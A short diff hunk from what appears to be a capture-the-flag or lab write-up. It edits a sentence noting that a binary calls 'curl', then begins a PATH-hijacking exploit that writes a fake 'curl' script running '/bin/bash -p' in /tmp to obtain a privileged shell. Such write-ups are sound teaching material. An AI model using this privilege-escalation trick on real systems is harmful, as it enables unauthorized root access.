@@ -336,7 +336,7 @@ http://lH
 ocalhostH
 ```
 \
-WE see that the binary is using the variable 'curl' , We can probably do a PATH hijacking here
+WE see that this executable is using the binary 'curl' , We can probably do a PATH hijacking here
 ```bash
 cd /tmp
 echo "/bin/bash -p" > curl
